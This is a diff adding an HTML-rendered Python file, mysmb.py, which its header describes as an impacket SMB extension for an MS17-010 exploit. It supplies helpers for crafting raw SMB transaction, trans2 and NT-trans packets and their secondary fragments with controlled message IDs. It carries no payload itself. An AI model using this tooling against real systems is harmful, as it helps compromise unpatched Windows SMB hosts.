@@ -1,0 +1,388 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>mysmb.py</title>
+</head><body>#!/usr/bin/env python<br/>
+# impacket SMB extension for MS17-010 exploit.<br/>
+# this file contains only valid SMB packet format operation.<br/>
+from impacket import smb, smbconnection<br/>
+from impacket.dcerpc.v5 import transport<br/>
+from struct import pack<br/>
+import os<br/>
+import random<br/>
+<br/>
+<br/>
+def getNTStatus(self):<br/>
+&#09;return (self['ErrorCode'] &lt;&lt; 16) | (self['_reserved'] &lt;&lt; 8) | self['ErrorClass']<br/>
+setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)<br/>
+<br/>
+############# SMB_COM_TRANSACTION_SECONDARY (0x26)<br/>
+class SMBTransactionSecondary_Parameters(smb.SMBCommand_Parameters):<br/>
+&#09;structure = (<br/>
+&#09;&#09;('TotalParameterCount','&lt;H=0'),<br/>
+&#09;&#09;('TotalDataCount','&lt;H'),<br/>
+&#09;&#09;('ParameterCount','&lt;H=0'),<br/>
+&#09;&#09;('ParameterOffset','&lt;H=0'),<br/>
+&#09;&#09;('ParameterDisplacement','&lt;H=0'),<br/>
+&#09;&#09;('DataCount','&lt;H'),<br/>
+&#09;&#09;('DataOffset','&lt;H'),<br/>
+&#09;&#09;('DataDisplacement','&lt;H=0'),<br/>
+)<br/>
+<br/>
+# Note: impacket-0.9.15 struct has no ParameterDisplacement<br/>
+############# SMB_COM_TRANSACTION2_SECONDARY (0x33)<br/>
+class SMBTransaction2Secondary_Parameters(smb.SMBCommand_Parameters):<br/>
+&#09;structure = (<br/>
+&#09;&#09;('TotalParameterCount','&lt;H=0'),<br/>
+&#09;&#09;('TotalDataCount','&lt;H'),<br/>
+&#09;&#09;('ParameterCount','&lt;H=0'),<br/>
+&#09;&#09;('ParameterOffset','&lt;H=0'),<br/>
+&#09;&#09;('ParameterDisplacement','&lt;H=0'),<br/>
+&#09;&#09;('DataCount','&lt;H'),<br/>
+&#09;&#09;('DataOffset','&lt;H'),<br/>
+&#09;&#09;('DataDisplacement','&lt;H=0'),<br/>
+&#09;&#09;('FID','&lt;H=0'),<br/>
+)<br/>
+<br/>
+############# SMB_COM_NT_TRANSACTION_SECONDARY (0xA1)<br/>
+class SMBNTTransactionSecondary_Parameters(smb.SMBCommand_Parameters):<br/>
+&#09;structure = (<br/>
+&#09;&#09;('Reserved1','3s=""'),<br/>
+&#09;&#09;('TotalParameterCount','&lt;L'),<br/>
+&#09;&#09;('TotalDataCount','&lt;L'),<br/>
+&#09;&#09;('ParameterCount','&lt;L'),<br/>
+&#09;&#09;('ParameterOffset','&lt;L'),<br/>
+&#09;&#09;('ParameterDisplacement','&lt;L=0'),<br/>
+&#09;&#09;('DataCount','&lt;L'),<br/>
+&#09;&#09;('DataOffset','&lt;L'),<br/>
+&#09;&#09;('DataDisplacement','&lt;L=0'),<br/>
+&#09;&#09;('Reserved2','&lt;B=0'),<br/>
+&#09;)<br/>
+<br/>
+<br/>
+def _put_trans_data(transCmd, parameters, data, noPad=False):<br/>
+&#09;# have to init offset before calling len()<br/>
+&#09;transCmd['Parameters']['ParameterOffset'] = 0<br/>
+&#09;transCmd['Parameters']['DataOffset'] = 0<br/>
+&#09;<br/>
+&#09;# SMB header: 32 bytes<br/>
+&#09;# WordCount: 1 bytes<br/>
+&#09;# ByteCount: 2 bytes<br/>
+&#09;# Note: Setup length is included when len(param) is called<br/>
+&#09;offset = 32 + 1 + len(transCmd['Parameters']) + 2<br/>
+&#09;<br/>
+&#09;transData = ''<br/>
+&#09;if len(parameters):<br/>
+&#09;&#09;padLen = 0 if noPad else (4 - offset % 4 ) % 4<br/>
+&#09;&#09;transCmd['Parameters']['ParameterOffset'] = offset + padLen<br/>
+&#09;&#09;transData = ('\x00' * padLen) + parameters<br/>
+&#09;&#09;offset += padLen + len(parameters)<br/>
+&#09;<br/>
+&#09;if len(data):<br/>
+&#09;&#09;padLen = 0 if noPad else (4 - offset % 4 ) % 4<br/>
+&#09;&#09;transCmd['Parameters']['DataOffset'] = offset + padLen<br/>
+&#09;&#09;transData += ('\x00' * padLen) + data<br/>
+&#09;<br/>
+&#09;transCmd['Data'] = transData<br/>
+&#09;<br/>
+<br/>
+origin_NewSMBPacket_addCommand = getattr(smb.NewSMBPacket, "addCommand")<br/>
+login_MaxBufferSize = 61440<br/>
+def NewSMBPacket_addCommand_hook_login(self, command):<br/>
+&#09;# restore NewSMBPacket.addCommand<br/>
+&#09;setattr(smb.NewSMBPacket, "addCommand", origin_NewSMBPacket_addCommand)<br/>
+&#09;<br/>
+&#09;if isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Extended_Parameters):<br/>
+&#09;&#09;command['Parameters']['MaxBufferSize'] = login_MaxBufferSize<br/>
+&#09;elif isinstance(command['Parameters'], smb.SMBSessionSetupAndX_Parameters):<br/>
+&#09;&#09;command['Parameters']['MaxBuffer'] = login_MaxBufferSize<br/>
+&#09;<br/>
+&#09;# call original one<br/>
+&#09;origin_NewSMBPacket_addCommand(self, command)<br/>
+<br/>
+def _setup_login_packet_hook(maxBufferSize):<br/>
+&#09;# setup hook for next NewSMBPacket.addCommand if maxBufferSize is not None<br/>
+&#09;if maxBufferSize is not None:<br/>
+&#09;&#09;global login_MaxBufferSize<br/>
+&#09;&#09;login_MaxBufferSize = maxBufferSize<br/>
+&#09;&#09;setattr(smb.NewSMBPacket, "addCommand", NewSMBPacket_addCommand_hook_login)<br/>
+<br/>
+<br/>
+class MYSMB(smb.SMB):<br/>
+&#09;def __init__(self, remote_host, use_ntlmv2=True, timeout=8):<br/>
+&#09;&#09;self.__use_ntlmv2 = use_ntlmv2<br/>
+&#09;&#09;self._default_tid = 0<br/>
+&#09;&#09;self._pid = os.getpid() &amp; 0xffff<br/>
+&#09;&#09;self._last_mid = random.randint(1000, 20000)<br/>
+&#09;&#09;if 0x4000 &lt;= self._last_mid &lt;= 0x4110:<br/>
+&#09;&#09;&#09;self._last_mid += 0x120<br/>
+&#09;&#09;self._pkt_flags2 = 0<br/>
+&#09;&#09;self._last_tid = 0 &nbsp;# last tid from connect_tree()<br/>
+&#09;&#09;self._last_fid = 0 &nbsp;# last fid from nt_create_andx()<br/>
+&#09;&#09;self._smbConn = None<br/>
+&#09;&#09;smb.SMB.__init__(self, remote_host, remote_host, timeout=timeout)<br/>
+<br/>
+&#09;def set_pid(self, pid):<br/>
+&#09;&#09;self._pid = pid<br/>
+<br/>
+&#09;def get_pid(self):<br/>
+&#09;&#09;return self._pid<br/>
+<br/>
+&#09;def set_last_mid(self, mid):<br/>
+&#09;&#09;self._last_mid = mid<br/>
+<br/>
+&#09;def next_mid(self):<br/>
+&#09;&#09;self._last_mid += random.randint(1, 20)<br/>
+&#09;&#09;if 0x4000 &lt;= self._last_mid &lt;= 0x4110:<br/>
+&#09;&#09;&#09;self._last_mid += 0x120<br/>
+&#09;&#09;return self._last_mid<br/>
+<br/>
+&#09;def get_smbconnection(self):<br/>
+&#09;&#09;if self._smbConn is None:<br/>
+&#09;&#09;&#09;self.smbConn = smbconnection.SMBConnection(self.get_remote_host(), self.get_remote_host(), existingConnection=self, manualNegotiate=True)<br/>
+&#09;&#09;return self.smbConn<br/>
+<br/>
+&#09;def get_dce_rpc(self, named_pipe):<br/>
+&#09;&#09;smbConn = self.get_smbconnection()<br/>
+&#09;&#09;rpctransport = transport.SMBTransport(self.get_remote_host(), self.get_remote_host(), filename='\\'+named_pipe, smb_connection=smbConn)<br/>
+&#09;&#09;return rpctransport.get_dce_rpc()<br/>
+<br/>
+&#09;# override SMB.neg_session() to allow forcing ntlm authentication<br/>
+&#09;def neg_session(self, extended_security=True, negPacket=None):<br/>
+&#09;&#09;smb.SMB.neg_session(self, extended_security=self.__use_ntlmv2, negPacket=negPacket)<br/>
+<br/>
+&#09;# to use any login method, SMB must not be used from multiple thread<br/>
+&#09;def login(self, user, password, domain='', lmhash='', nthash='', ntlm_fallback=True, maxBufferSize=None):<br/>
+&#09;&#09;_setup_login_packet_hook(maxBufferSize)<br/>
+&#09;&#09;smb.SMB.login(self, user, password, domain, lmhash, nthash, ntlm_fallback)<br/>
+<br/>
+&#09;def login_standard(self, user, password, domain='', lmhash='', nthash='', maxBufferSize=None):<br/>
+&#09;&#09;_setup_login_packet_hook(maxBufferSize)<br/>
+&#09;&#09;smb.SMB.login_standard(self, user, password, domain, lmhash, nthash)<br/>
+<br/>
+&#09;def login_extended(self, user, password, domain='', lmhash='', nthash='', use_ntlmv2=True, maxBufferSize=None):<br/>
+&#09;&#09;_setup_login_packet_hook(maxBufferSize)<br/>
+&#09;&#09;smb.SMB.login_extended(self, user, password, domain, lmhash, nthash, use_ntlmv2)<br/>
+<br/>
+&#09;def connect_tree(self, path, password=None, service=smb.SERVICE_ANY, smb_packet=None):<br/>
+&#09;&#09;self._last_tid = smb.SMB.tree_connect_andx(self, path, password, service, smb_packet)<br/>
+&#09;&#09;return self._last_tid<br/>
+<br/>
+&#09;def get_last_tid(self):<br/>
+&#09;&#09;return self._last_tid<br/>
+<br/>
+&#09;def nt_create_andx(self, tid, filename, smb_packet=None, cmd=None, shareAccessMode=smb.FILE_SHARE_READ|smb.FILE_SHARE_WRITE, disposition=smb.FILE_OPEN, accessMask=0x2019f):<br/>
+&#09;&#09;self._last_fid = smb.SMB.nt_create_andx(self, tid, filename, smb_packet, cmd, shareAccessMode, disposition, accessMask)<br/>
+&#09;&#09;return self._last_fid<br/>
+<br/>
+&#09;def get_last_fid(self):<br/>
+&#09;&#09;return self._last_fid<br/>
+<br/>
+&#09;def set_default_tid(self, tid):<br/>
+&#09;&#09;self._default_tid = tid<br/>
+<br/>
+&#09;def set_pkt_flags2(self, flags):<br/>
+&#09;&#09;self._pkt_flags2 = flags<br/>
+<br/>
+&#09;def send_echo(self, data):<br/>
+&#09;&#09;pkt = smb.NewSMBPacket()<br/>
+&#09;&#09;pkt['Tid'] = self._default_tid<br/>
+&#09;&#09;<br/>
+&#09;&#09;transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)<br/>
+&#09;&#09;transCommand['Parameters'] = smb.SMBEcho_Parameters()<br/>
+&#09;&#09;transCommand['Data'] = smb.SMBEcho_Data()<br/>
+<br/>
+&#09;&#09;transCommand['Parameters']['EchoCount'] = 1<br/>
+&#09;&#09;transCommand['Data']['Data'] = data<br/>
+&#09;&#09;pkt.addCommand(transCommand)<br/>
+<br/>
+&#09;&#09;self.sendSMB(pkt)<br/>
+&#09;&#09;return self.recvSMB()<br/>
+<br/>
+&#09;def do_write_andx_raw_pipe(self, fid, data, mid=None, pid=None, tid=None):<br/>
+&#09;&#09;writeAndX = smb.SMBCommand(smb.SMB.SMB_COM_WRITE_ANDX)<br/>
+&#09;&#09;writeAndX['Parameters'] = smb.SMBWriteAndX_Parameters_Short()<br/>
+&#09;&#09;writeAndX['Parameters']['Fid'] = fid<br/>
+&#09;&#09;writeAndX['Parameters']['Offset'] = 0<br/>
+&#09;&#09;writeAndX['Parameters']['WriteMode'] = 4 &nbsp;# SMB_WMODE_WRITE_RAW_NAMED_PIPE<br/>
+&#09;&#09;writeAndX['Parameters']['Remaining'] = 12345 &nbsp;# can be any. raw named pipe does not use it<br/>
+&#09;&#09;writeAndX['Parameters']['DataLength'] = len(data)<br/>
+&#09;&#09;writeAndX['Parameters']['DataOffset'] = 32 + len(writeAndX['Parameters']) + 1 + 2 + 1 # WordCount(1), ByteCount(2), Padding(1)<br/>
+&#09;&#09;writeAndX['Data'] = '\x00' + data &nbsp;# pad 1 byte<br/>
+&#09;&#09;<br/>
+&#09;&#09;self.send_raw(self.create_smb_packet(writeAndX, mid, pid, tid))<br/>
+&#09;&#09;return self.recvSMB()<br/>
+<br/>
+&#09;def create_smb_packet(self, smbReq, mid=None, pid=None, tid=None):<br/>
+&#09;&#09;if mid is None:<br/>
+&#09;&#09;&#09;mid = self.next_mid()<br/>
+&#09;&#09;<br/>
+&#09;&#09;pkt = smb.NewSMBPacket()<br/>
+&#09;&#09;pkt.addCommand(smbReq)<br/>
+&#09;&#09;pkt['Tid'] = self._default_tid if tid is None else tid<br/>
+&#09;&#09;pkt['Uid'] = self._uid<br/>
+&#09;&#09;pkt['Pid'] = self._pid if pid is None else pid<br/>
+&#09;&#09;pkt['Mid'] = mid<br/>
+&#09;&#09;flags1, flags2 = self.get_flags()<br/>
+&#09;&#09;pkt['Flags1'] = flags1<br/>
+&#09;&#09;pkt['Flags2'] = self._pkt_flags2 if self._pkt_flags2 != 0 else flags2<br/>
+&#09;&#09;<br/>
+&#09;&#09;if self._SignatureEnabled:<br/>
+&#09;&#09;&#09;pkt['Flags2'] |= smb.SMB.FLAGS2_SMB_SECURITY_SIGNATURE<br/>
+&#09;&#09;&#09;self.signSMB(pkt, self._SigningSessionKey, self._SigningChallengeResponse)<br/>
+&#09;&#09;&#09;<br/>
+&#09;&#09;req = str(pkt)<br/>
+&#09;&#09;return '\x00'*2 + pack('&gt;H', len(req)) + req &nbsp;# assume length is &lt;65536<br/>
+<br/>
+&#09;def send_raw(self, data):<br/>
+&#09;&#09;self.get_socket().send(data)<br/>
+<br/>
+&#09;def create_trans_packet(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;if maxSetupCount is None:<br/>
+&#09;&#09;&#09;maxSetupCount = len(setup)<br/>
+&#09;&#09;if totalParameterCount is None:<br/>
+&#09;&#09;&#09;totalParameterCount = len(param)<br/>
+&#09;&#09;if totalDataCount is None:<br/>
+&#09;&#09;&#09;totalDataCount = len(data)<br/>
+&#09;&#09;if maxParameterCount is None:<br/>
+&#09;&#09;&#09;maxParameterCount = totalParameterCount<br/>
+&#09;&#09;if maxDataCount is None:<br/>
+&#09;&#09;&#09;maxDataCount = totalDataCount<br/>
+&#09;&#09;transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION)<br/>
+&#09;&#09;transCmd['Parameters'] = smb.SMBTransaction_Parameters()<br/>
+&#09;&#09;transCmd['Parameters']['TotalParameterCount'] = totalParameterCount<br/>
+&#09;&#09;transCmd['Parameters']['TotalDataCount'] = totalDataCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxParameterCount'] = maxParameterCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxDataCount'] = maxDataCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxSetupCount'] = maxSetupCount<br/>
+&#09;&#09;transCmd['Parameters']['Flags'] = 0<br/>
+&#09;&#09;transCmd['Parameters']['Timeout'] = 0xffffffff<br/>
+&#09;&#09;transCmd['Parameters']['ParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['DataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['Setup'] = setup<br/>
+&#09;&#09;_put_trans_data(transCmd, param, data, noPad)<br/>
+&#09;&#09;return self.create_smb_packet(transCmd, mid, pid, tid)<br/>
+<br/>
+&#09;def send_trans(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))<br/>
+&#09;&#09;return self.recvSMB()<br/>
+<br/>
+&#09;def create_trans_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION_SECONDARY)<br/>
+&#09;&#09;transCmd['Parameters'] = SMBTransactionSecondary_Parameters()<br/>
+&#09;&#09;transCmd['Parameters']['TotalParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['TotalDataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['ParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement<br/>
+&#09;&#09;transCmd['Parameters']['DataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['DataDisplacement'] = dataDisplacement<br/>
+&#09;&#09;<br/>
+&#09;&#09;_put_trans_data(transCmd, param, data, noPad)<br/>
+&#09;&#09;return self.create_smb_packet(transCmd, mid, pid, tid)<br/>
+<br/>
+&#09;def send_trans_secondary(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;self.send_raw(self.create_trans_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))<br/>
+<br/>
+&#09;def create_trans2_packet(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;if maxSetupCount is None:<br/>
+&#09;&#09;&#09;maxSetupCount = len(setup)<br/>
+&#09;&#09;if totalParameterCount is None:<br/>
+&#09;&#09;&#09;totalParameterCount = len(param)<br/>
+&#09;&#09;if totalDataCount is None:<br/>
+&#09;&#09;&#09;totalDataCount = len(data)<br/>
+&#09;&#09;if maxParameterCount is None:<br/>
+&#09;&#09;&#09;maxParameterCount = totalParameterCount<br/>
+&#09;&#09;if maxDataCount is None:<br/>
+&#09;&#09;&#09;maxDataCount = totalDataCount<br/>
+&#09;&#09;transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2)<br/>
+&#09;&#09;transCmd['Parameters'] = smb.SMBTransaction2_Parameters()<br/>
+&#09;&#09;transCmd['Parameters']['TotalParameterCount'] = totalParameterCount<br/>
+&#09;&#09;transCmd['Parameters']['TotalDataCount'] = totalDataCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxParameterCount'] = maxParameterCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxDataCount'] = maxDataCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxSetupCount'] = len(setup)<br/>
+&#09;&#09;transCmd['Parameters']['Flags'] = 0<br/>
+&#09;&#09;transCmd['Parameters']['Timeout'] = 0xffffffff<br/>
+&#09;&#09;transCmd['Parameters']['ParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['DataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['Setup'] = setup<br/>
+&#09;&#09;_put_trans_data(transCmd, param, data, noPad)<br/>
+&#09;&#09;return self.create_smb_packet(transCmd, mid, pid, tid)<br/>
+<br/>
+&#09;def send_trans2(self, setup, param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;self.send_raw(self.create_trans2_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))<br/>
+&#09;&#09;return self.recvSMB()<br/>
+<br/>
+&#09;def create_trans2_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;transCmd = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)<br/>
+&#09;&#09;transCmd['Parameters'] = SMBTransaction2Secondary_Parameters()<br/>
+&#09;&#09;transCmd['Parameters']['TotalParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['TotalDataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['ParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement<br/>
+&#09;&#09;transCmd['Parameters']['DataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['DataDisplacement'] = dataDisplacement<br/>
+&#09;&#09;<br/>
+&#09;&#09;_put_trans_data(transCmd, param, data, noPad)<br/>
+&#09;&#09;return self.create_smb_packet(transCmd, mid, pid, tid)<br/>
+<br/>
+&#09;def send_trans2_secondary(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;self.send_raw(self.create_trans2_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))<br/>
+<br/>
+&#09;def create_nt_trans_packet(self, function, setup='', param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;if maxSetupCount is None:<br/>
+&#09;&#09;&#09;maxSetupCount = len(setup)<br/>
+&#09;&#09;if totalParameterCount is None:<br/>
+&#09;&#09;&#09;totalParameterCount = len(param)<br/>
+&#09;&#09;if totalDataCount is None:<br/>
+&#09;&#09;&#09;totalDataCount = len(data)<br/>
+&#09;&#09;if maxParameterCount is None:<br/>
+&#09;&#09;&#09;maxParameterCount = totalParameterCount<br/>
+&#09;&#09;if maxDataCount is None:<br/>
+&#09;&#09;&#09;maxDataCount = totalDataCount<br/>
+&#09;&#09;transCmd = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)<br/>
+&#09;&#09;transCmd['Parameters'] = smb.SMBNTTransaction_Parameters()<br/>
+&#09;&#09;transCmd['Parameters']['MaxSetupCount'] = maxSetupCount<br/>
+&#09;&#09;transCmd['Parameters']['TotalParameterCount'] = totalParameterCount<br/>
+&#09;&#09;transCmd['Parameters']['TotalDataCount'] = totalDataCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxParameterCount'] = maxParameterCount<br/>
+&#09;&#09;transCmd['Parameters']['MaxDataCount'] = maxDataCount<br/>
+&#09;&#09;transCmd['Parameters']['ParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['DataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['Function'] = function<br/>
+&#09;&#09;transCmd['Parameters']['Setup'] = setup<br/>
+&#09;&#09;_put_trans_data(transCmd, param, data, noPad)<br/>
+&#09;&#09;return self.create_smb_packet(transCmd, mid, pid, tid)<br/>
+<br/>
+&#09;def send_nt_trans(self, function, setup='', param='', data='', mid=None, maxSetupCount=None, totalParameterCount=None, totalDataCount=None, maxParameterCount=None, maxDataCount=None, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;self.send_raw(self.create_nt_trans_packet(function, setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))<br/>
+&#09;&#09;return self.recvSMB()<br/>
+<br/>
+&#09;def create_nt_trans_secondary_packet(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;transCmd = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT_SECONDARY)<br/>
+&#09;&#09;transCmd['Parameters'] = SMBNTTransactionSecondary_Parameters()<br/>
+&#09;&#09;transCmd['Parameters']['TotalParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['TotalDataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['ParameterCount'] = len(param)<br/>
+&#09;&#09;transCmd['Parameters']['ParameterDisplacement'] = paramDisplacement<br/>
+&#09;&#09;transCmd['Parameters']['DataCount'] = len(data)<br/>
+&#09;&#09;transCmd['Parameters']['DataDisplacement'] = dataDisplacement<br/>
+&#09;&#09;_put_trans_data(transCmd, param, data, noPad)<br/>
+&#09;&#09;return self.create_smb_packet(transCmd, mid, pid, tid)<br/>
+<br/>
+&#09;def send_nt_trans_secondary(self, mid, param='', paramDisplacement=0, data='', dataDisplacement=0, pid=None, tid=None, noPad=False):<br/>
+&#09;&#09;self.send_raw(self.create_nt_trans_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))<br/>
+<br/>
+&#09;def recv_transaction_data(self, mid, minLen):<br/>
+&#09;&#09;data = ''<br/>
+&#09;&#09;while len(data) &lt; minLen:<br/>
+&#09;&#09;&#09;recvPkt = self.recvSMB()<br/>
+&#09;&#09;&#09;if recvPkt['Mid'] != mid:<br/>
+&#09;&#09;&#09;&#09;continue<br/>
+&#09;&#09;&#09;resp = smb.SMBCommand(recvPkt['Data'][0])<br/>
+&#09;&#09;&#09;data += resp['Data'][1:] &nbsp;# skip padding<br/>
+&#09;&#09;&#09;#print(len(data))<br/>
+&#09;&#09;return data<br/>
+<br/>
+</body></html>
